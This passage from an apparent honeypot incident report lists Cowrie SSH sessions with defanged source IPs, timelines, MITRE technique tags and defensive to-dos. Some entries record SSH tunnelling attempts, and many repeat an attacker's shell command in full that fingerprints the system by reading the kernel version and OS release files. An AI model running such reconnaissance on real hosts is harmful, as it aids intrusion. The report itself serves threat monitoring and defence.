| `2026-07-31 07:45:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.236.161[.]139` to AbuseIPDB if not already reported
- [ ] Block `47.236.161[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7ac7f3b3394

| Field | Detail |
|---|---|
| **Source IP** | `200.89.159[.]59` |
| **First Seen** | 2026-07-31 07:46 |
| **Last Seen** | 2026-07-31 07:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 07:46:11` | `cowrie.session.connect` |
| `2026-07-31 07:46:12` | `cowrie.client.version` |
| `2026-07-31 07:46:12` | `cowrie.client.kex` |
| `2026-07-31 07:46:13` | `cowrie.login.success` |
| `2026-07-31 07:46:14` | `cowrie.direct-tcpip.request` |
| `2026-07-31 07:46:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.89.159[.]59` to AbuseIPDB if not already reported
- [ ] Block `200.89.159[.]59` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc3d97d05362

| Field | Detail |
|---|---|
| **Source IP** | `201.63.52[.]54` |
| **First Seen** | 2026-07-31 07:46 |
| **Last Seen** | 2026-07-31 07:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 07:46:19` | `cowrie.session.connect` |
| `2026-07-31 07:46:20` | `cowrie.client.version` |
| `2026-07-31 07:46:20` | `cowrie.client.kex` |
| `2026-07-31 07:46:21` | `cowrie.login.success` |
| `2026-07-31 07:46:22` | `cowrie.direct-tcpip.request` |
| `2026-07-31 07:46:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.63.52[.]54` to AbuseIPDB if not already reported
- [ ] Block `201.63.52[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0aa7b986758a

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-07-31 07:47 |
| **Last Seen** | 2026-07-31 07:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 07:47:57` | `cowrie.session.connect` |
| `2026-07-31 07:47:57` | `cowrie.client.version` |
| `2026-07-31 07:47:57` | `cowrie.client.kex` |
| `2026-07-31 07:47:59` | `cowrie.login.success` |
| `2026-07-31 07:48:01` | `cowrie.session.params` |
| `2026-07-31 07:48:01` | `cowrie.command.input` |
| `2026-07-31 07:48:01` | `cowrie.command.input` |
| `2026-07-31 07:48:01` | `cowrie.command.input` |
| `2026-07-31 07:48:01` | `cowrie.command.input` |
| `2026-07-31 07:48:01` | `cowrie.command.input` |
| `2026-07-31 07:48:01` | `cowrie.command.success` |
| `2026-07-31 07:48:01` | `cowrie.command.input` |
| `2026-07-31 07:48:01` | `cowrie.command.input` |
| `2026-07-31 07:48:01` | `cowrie.command.input` |
| `2026-07-31 07:48:01` | `cowrie.command.input` |
| `2026-07-31 07:48:01` | `cowrie.log.closed` |
| `2026-07-31 07:48:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1f4fa07f8bc

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-31 07:49 |
| **Last Seen** | 2026-07-31 07:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 07:49:09` | `cowrie.session.connect` |
| `2026-07-31 07:49:09` | `cowrie.client.version` |
| `2026-07-31 07:49:10` | `cowrie.client.kex` |
| `2026-07-31 07:49:10` | `cowrie.login.success` |
| `2026-07-31 07:49:10` | `cowrie.direct-tcpip.request` |
| `2026-07-31 07:49:10` | `cowrie.direct-tcpip.data` |
| `2026-07-31 07:49:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e49a4b44f9b

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-07-31 07:50 |
| **Last Seen** | 2026-07-31 07:50 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 07:50:12` | `cowrie.session.connect` |
| `2026-07-31 07:50:13` | `cowrie.client.version` |
| `2026-07-31 07:50:13` | `cowrie.client.kex` |
| `2026-07-31 07:50:15` | `cowrie.login.success` |
| `2026-07-31 07:50:17` | `cowrie.session.params` |
| `2026-07-31 07:50:17` | `cowrie.command.input` |
| `2026-07-31 07:50:17` | `cowrie.command.input` |
| `2026-07-31 07:50:17` | `cowrie.command.input` |
| `2026-07-31 07:50:17` | `cowrie.command.input` |
| `2026-07-31 07:50:17` | `cowrie.command.input` |
| `2026-07-31 07:50:17` | `cowrie.command.success` |
| `2026-07-31 07:50:17` | `cowrie.command.input` |
| `2026-07-31 07:50:17` | `cowrie.command.input` |
| `2026-07-31 07:50:17` | `cowrie.command.input` |
| `2026-07-31 07:50:17` | `cowrie.command.input` |
| `2026-07-31 07:50:17` | `cowrie.log.closed` |
| `2026-07-31 07:50:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53305dcbff59

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-07-31 07:52 |
| **Last Seen** | 2026-07-31 07:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 07:52:43` | `cowrie.session.connect` |
| `2026-07-31 07:52:43` | `cowrie.client.version` |
| `2026-07-31 07:52:43` | `cowrie.client.kex` |
| `2026-07-31 07:52:44` | `cowrie.login.success` |
| `2026-07-31 07:52:44` | `cowrie.session.params` |
| `2026-07-31 07:52:44` | `cowrie.command.input` |
| `2026-07-31 07:52:44` | `cowrie.command.input` |
| `2026-07-31 07:52:44` | `cowrie.command.input` |
| `2026-07-31 07:52:44` | `cowrie.command.input` |
| `2026-07-31 07:52:44` | `cowrie.command.input` |
| `2026-07-31 07:52:44` | `cowrie.command.success` |
| `2026-07-31 07:52:44` | `cowrie.command.input` |
| `2026-07-31 07:52:44` | `cowrie.command.input` |
| `2026-07-31 07:52:44` | `cowrie.command.input` |
| `2026-07-31 07:52:44` | `cowrie.command.input` |
| `2026-07-31 07:52:44` | `cowrie.log.closed` |
| `2026-07-31 07:52:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d776c586b0a3

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-07-31 08:00 |
| **Last Seen** | 2026-07-31 08:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 08:00:24` | `cowrie.session.connect` |
| `2026-07-31 08:00:24` | `cowrie.client.version` |
| `2026-07-31 08:00:24` | `cowrie.client.kex` |
| `2026-07-31 08:00:24` | `cowrie.login.success` |
| `2026-07-31 08:00:25` | `cowrie.session.params` |
| `2026-07-31 08:00:25` | `cowrie.command.input` |
| `2026-07-31 08:00:25` | `cowrie.command.input` |
| `2026-07-31 08:00:25` | `cowrie.command.input` |
| `2026-07-31 08:00:25` | `cowrie.command.input` |
| `2026-07-31 08:00:25` | `cowrie.command.input` |
| `2026-07-31 08:00:25` | `cowrie.command.success` |
| `2026-07-31 08:00:25` | `cowrie.command.input` |
| `2026-07-31 08:00:25` | `cowrie.command.input` |
| `2026-07-31 08:00:25` | `cowrie.command.input` |
| `2026-07-31 08:00:25` | `cowrie.command.input` |
| `2026-07-31 08:00:25` | `cowrie.log.closed` |
| `2026-07-31 08:00:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-389b2e190392

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-07-31 08:04 |
| **Last Seen** | 2026-07-31 08:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 08:04:47` | `cowrie.session.connect` |
| `2026-07-31 08:04:47` | `cowrie.client.version` |
| `2026-07-31 08:04:47` | `cowrie.client.kex` |
| `2026-07-31 08:04:47` | `cowrie.login.success` |
| `2026-07-31 08:04:48` | `cowrie.session.params` |
| `2026-07-31 08:04:48` | `cowrie.command.input` |
| `2026-07-31 08:04:48` | `cowrie.command.input` |
| `2026-07-31 08:04:48` | `cowrie.command.input` |
| `2026-07-31 08:04:48` | `cowrie.command.input` |
| `2026-07-31 08:04:48` | `cowrie.command.input` |
| `2026-07-31 08:04:48` | `cowrie.command.success` |
| `2026-07-31 08:04:48` | `cowrie.command.input` |
| `2026-07-31 08:04:48` | `cowrie.command.input` |
| `2026-07-31 08:04:48` | `cowrie.command.input` |
| `2026-07-31 08:04:48` | `cowrie.command.input` |
| `2026-07-31 08:04:48` | `cowrie.log.closed` |
| `2026-07-31 08:04:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-330dc3b40b9c

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-07-31 08:07 |
| **Last Seen** | 2026-07-31 08:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 08:07:39` | `cowrie.session.connect` |
| `2026-07-31 08:07:40` | `cowrie.client.version` |
| `2026-07-31 08:07:40` | `cowrie.client.kex` |
| `2026-07-31 08:07:41` | `cowrie.login.success` |
| `2026-07-31 08:07:42` | `cowrie.session.params` |
| `2026-07-31 08:07:42` | `cowrie.command.input` |
| `2026-07-31 08:07:42` | `cowrie.command.input` |
| `2026-07-31 08:07:42` | `cowrie.command.input` |
| `2026-07-31 08:07:42` | `cowrie.command.input` |
| `2026-07-31 08:07:42` | `cowrie.command.input` |
| `2026-07-31 08:07:42` | `cowrie.command.success` |
| `2026-07-31 08:07:42` | `cowrie.command.input` |
| `2026-07-31 08:07:42` | `cowrie.command.input` |
| `2026-07-31 08:07:42` | `cowrie.command.input` |
| `2026-07-31 08:07:42` | `cowrie.command.input` |
| `2026-07-31 08:07:43` | `cowrie.log.closed` |
| `2026-07-31 08:07:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2378d97098aa

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-07-31 08:11 |
| **Last Seen** | 2026-07-31 08:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 08:11:55` | `cowrie.session.connect` |
| `2026-07-31 08:11:55` | `cowrie.client.version` |
| `2026-07-31 08:11:55` | `cowrie.client.kex` |
| `2026-07-31 08:11:55` | `cowrie.login.success` |
| `2026-07-31 08:11:56` | `cowrie.session.params` |
| `2026-07-31 08:11:56` | `cowrie.command.input` |
| `2026-07-31 08:11:56` | `cowrie.command.input` |
| `2026-07-31 08:11:56` | `cowrie.command.input` |
| `2026-07-31 08:11:56` | `cowrie.command.input` |
| `2026-07-31 08:11:56` | `cowrie.command.input` |
| `2026-07-31 08:11:56` | `cowrie.command.success` |
| `2026-07-31 08:11:56` | `cowrie.command.input` |
| `2026-07-31 08:11:56` | `cowrie.command.input` |
| `2026-07-31 08:11:56` | `cowrie.command.input` |
| `2026-07-31 08:11:56` | `cowrie.command.input` |
| `2026-07-31 08:11:56` | `cowrie.log.closed` |
| `2026-07-31 08:11:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a29a2b3498fa

| Field | Detail |
|---|---|
| **Source IP** | `186.235.193[.]170` |
| **First Seen** | 2026-07-31 08:12 |
| **Last Seen** | 2026-07-31 08:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 08:12:37` | `cowrie.session.connect` |
| `2026-07-31 08:12:38` | `cowrie.client.version` |
| `2026-07-31 08:12:38` | `cowrie.client.kex` |
| `2026-07-31 08:12:40` | `cowrie.login.success` |
| `2026-07-31 08:12:41` | `cowrie.direct-tcpip.request` |
| `2026-07-31 08:12:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.235.193[.]170` to AbuseIPDB if not already reported
- [ ] Block `186.235.193[.]170` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63974d439959

| Field | Detail |
|---|---|
| **Source IP** | `58.34.174[.]90` |
| **First Seen** | 2026-07-31 08:12 |
| **Last Seen** | 2026-07-31 08:12 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 08:12:46` | `cowrie.session.connect` |
| `2026-07-31 08:12:47` | `cowrie.client.version` |
| `2026-07-31 08:12:47` | `cowrie.client.kex` |
| `2026-07-31 08:12:50` | `cowrie.login.success` |
| `2026-07-31 08:12:52` | `cowrie.direct-tcpip.request` |
| `2026-07-31 08:12:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.34.174[.]90` to AbuseIPDB if not already reported
- [ ] Block `58.34.174[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01ab0e201920

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-07-31 08:19 |
| **Last Seen** | 2026-07-31 08:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 08:19:22` | `cowrie.session.connect` |
| `2026-07-31 08:19:23` | `cowrie.client.version` |
| `2026-07-31 08:19:23` | `cowrie.client.kex` |
| `2026-07-31 08:19:23` | `cowrie.login.success` |
| `2026-07-31 08:19:25` | `cowrie.session.params` |
| `2026-07-31 08:19:25` | `cowrie.command.input` |
| `2026-07-31 08:19:25` | `cowrie.command.input` |
| `2026-07-31 08:19:25` | `cowrie.command.input` |
| `2026-07-31 08:19:25` | `cowrie.command.input` |
| `2026-07-31 08:19:25` | `cowrie.command.input` |
| `2026-07-31 08:19:25` | `cowrie.command.success` |
| `2026-07-31 08:19:25` | `cowrie.command.input` |
| `2026-07-31 08:19:25` | `cowrie.command.input` |
| `2026-07-31 08:19:25` | `cowrie.command.input` |
| `2026-07-31 08:19:25` | `cowrie.command.input` |
| `2026-07-31 08:19:25` | `cowrie.log.closed` |
| `2026-07-31 08:19:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5dddcd8759f9

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-07-31 08:23 |
| **Last Seen** | 2026-07-31 08:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 08:23:18` | `cowrie.session.connect` |
| `2026-07-31 08:23:19` | `cowrie.client.version` |
| `2026-07-31 08:23:19` | `cowrie.client.kex` |
| `2026-07-31 08:23:20` | `cowrie.login.success` |
| `2026-07-31 08:23:21` | `cowrie.session.params` |
| `2026-07-31 08:23:21` | `cowrie.command.input` |
| `2026-07-31 08:23:21` | `cowrie.command.input` |
| `2026-07-31 08:23:21` | `cowrie.command.input` |
| `2026-07-31 08:23:21` | `cowrie.command.input` |
| `2026-07-31 08:23:21` | `cowrie.command.input` |
| `2026-07-31 08:23:21` | `cowrie.command.success` |
| `2026-07-31 08:23:21` | `cowrie.command.input` |
| `2026-07-31 08:23:21` | `cowrie.command.input` |
| `2026-07-31 08:23:21` | `cowrie.command.input` |
| `2026-07-31 08:23:21` | `cowrie.command.input` |
| `2026-07-31 08:23:21` | `cowrie.log.closed` |
| `2026-07-31 08:23:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d9dfbfe8e60

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-07-31 08:25 |
| **Last Seen** | 2026-07-31 08:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 08:25:44` | `cowrie.session.connect` |
| `2026-07-31 08:25:44` | `cowrie.client.version` |
